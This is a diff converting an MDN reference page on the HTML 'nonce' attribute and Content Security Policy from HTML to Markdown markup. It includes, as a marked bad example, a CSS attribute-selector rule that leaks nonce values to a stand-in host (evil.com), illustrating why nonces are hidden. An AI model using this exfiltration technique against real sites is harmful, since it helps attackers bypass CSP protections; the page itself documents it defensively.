@@ -7,78 +7,87 @@ tags:
   - Reference
 browser-compat: html.global_attributes.nonce
 ---
-<div>{{HTMLSidebar("Global_attributes")}}</div>
+{{HTMLSidebar("Global_attributes")}}
 
-<p>The <strong><code>nonce</code></strong> <a href="/en-US/docs/Web/HTML/Global_attributes">global attribute</a>
+The **`nonce`** [global attribute](/en-US/docs/Web/HTML/Global_attributes)
 is a content attribute defining a cryptographic nonce ("number used once") which can be used by
-<a href="/en-US/docs/Web/HTTP/CSP">Content Security Policy</a> to determine whether or not a given fetch will
-be allowed to proceed for a given element.</p>
+[Content Security Policy](/en-US/docs/Web/HTTP/CSP) to determine whether or not a given fetch will
+be allowed to proceed for a given element.
 
-<h2>Description</h2>
+## Description
 
-<p>The <code>nonce</code> attribute is useful to allow-list specific elements, such as a particular inline script or style elements.
-It can help you to avoid using the <a href="/en-US/docs/Web/HTTP/CSP">CSP</a> <code>unsafe-inline</code> directive, which would allow-list <em>all</em> inline scripts or styles.</p>
+The `nonce` attribute is useful to allow-list specific elements, such as a particular inline script or style elements.
+It can help you to avoid using the [CSP](/en-US/docs/Web/HTTP/CSP) `unsafe-inline` directive, which would allow-list *all* inline scripts or styles.
 
-<div class="note"><p><strong>Note:</strong> Only use <code>nonce</code> for cases where you have no way around using unsafe inline script
-or style contents. If you don't need <code>nonce</code>, don't use it. If your script is static, you could also use a CSP hash instead.
-(See usage notes on <a href="/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#unsafe_inline_script">unsafe inline script</a>.)
-Always try to take full advantage of <a href="/en-US/docs/Web/HTTP/CSP">CSP</a> protections and avoid nonces or unsafe inline scripts whenever possible.</p></div>
+> **Note:** Only use `nonce` for cases where you have no way around using unsafe inline script
+> or style contents. If you don't need `nonce`, don't use it. If your script is static, you could also use a CSP hash instead.
+> (See usage notes on [unsafe inline script](/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#unsafe_inline_script).)
+> Always try to take full advantage of [CSP](/en-US/docs/Web/HTTP/CSP) protections and avoid nonces or unsafe inline scripts whenever possible.
 
-<h3>Using nonce to allow-list a &lt;script&gt; element</h3>
+### Using nonce to allow-list a \<script> element
 
-<p>There are a few steps involved to allow-list an inline script using the nonce mechanism:</p>
+There are a few steps involved to allow-list an inline script using the nonce mechanism:
 
-<h4>Generating values</h4>
-<p>From your web server, generate a random base64-encoded string of at least 128 bits of data from a cryptographically secure
-random number generator. Nonces should be generated differently each time the page loads (nonce only once!). For example, in nodejs:</p>
+#### Generating values
 
-<pre class="brush: css">
+From your web server, generate a random base64-encoded string of at least 128 bits of data from a cryptographically secure
+random number generator. Nonces should be generated differently each time the page loads (nonce only once!). For example, in nodejs:
+
+```css
 const crypto = require('crypto');
 crypto.randomBytes(16).toString('base64');
 // '8IBTHwOdqNKAWeKl7plt8g=='
-</pre>
+```
 
-<h4>Allow-listing inline script</h4>
+#### Allow-listing inline script
 
-<p>The nonce generated on your backend code should now be used for the inline script that you'd like to allow-list:</p>
+The nonce generated on your backend code should now be used for the inline script that you'd like to allow-list:
 
-<pre class="brush: html">&lt;script nonce="8IBTHwOdqNKAWeKl7plt8g=="&gt;…&lt;/script&gt;</pre>
+```html
+<script nonce="8IBTHwOdqNKAWeKl7plt8g==">…</script>
+```
 
-<h4>Sending a nonce with a CSP header</h4>
+#### Sending a nonce with a CSP header
 
-<p>Finally, you'll need to send the nonce value in a
-<a href="/en-US/docs/Web/HTTP/Headers/Content-Security-Policy"><code>Content-Security-Policy</code></a> header
-(prepend <code>nonce-</code>):</p>
+Finally, you'll need to send the nonce value in a
+[`Content-Security-Policy`](/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) header
+(prepend `nonce-`):
 
-<pre>Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='</pre>
+    Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='
 
-<h3>Accessing nonces and nonce hiding</h3>
+### Accessing nonces and nonce hiding
 
-<p>For security reasons, the <code>nonce</code> content attribute is hidden (an empty string will be returned).</p>
-<pre class="brush: js example-bad">script.getAttribute('nonce'); // returns empty string</pre>
+For security reasons, the `nonce` content attribute is hidden (an empty string will be returned).
 
-<p>The <a href="/en-US/docs/Web/API/HTMLElement/nonce"><code>nonce</code></a> property is the only way to access nonces:</p>
-<pre class="brush: js example-good">script.nonce; // returns nonce value</pre>
+```js example-bad
+script.getAttribute('nonce'); // returns empty string
+```
 
-<p>Nonce hiding helps prevent attackers from exfiltrating nonce data via mechanisms that can grab data
-from content attributes like this:</p>
+The [`nonce`](/en-US/docs/Web/API/HTMLElement/nonce) property is the only way to access nonces:
 
-<pre class="brush: css example-bad">script[nonce~=whatever] {
+```js example-good
+script.nonce; // returns nonce value
+```
+
+Nonce hiding helps prevent attackers from exfiltrating nonce data via mechanisms that can grab data
+from content attributes like this:
+
+```css example-bad
+script[nonce~=whatever] {
   background: url("https://evil.com/nonce?whatever");
-}</pre>
+}
+```
 
-<h2 id="Specifications">Specifications</h2>
+## Specifications
 
-<p>{{Specifications}}</p>
+{{Specifications}}
 
-<h2 id="Browser_compatibility">Browser compatibility</h2>
+## Browser compatibility
 
-<p>{{Compat}}</p>
+{{Compat}}
 
-<h2 id="See_also">See also</h2>
+## See also
 
-<ul>
- <li><a href="/en-US/docs/Web/API/HTMLElement/nonce"><code>HTMLElement.nonce</code></a></li>
- <li><a href="/en-US/docs/Web/HTTP/CSP">Content Security Policy</a></li>
- <li>CSP: <a href="/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src"><code>script-src</code></a></li>
-</ul>
+*   [`HTMLElement.nonce`](/en-US/docs/Web/API/HTMLElement/nonce)
+*   [Content Security Policy](/en-US/docs/Web/HTTP/CSP)
+*   CSP: [`script-src`](/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)
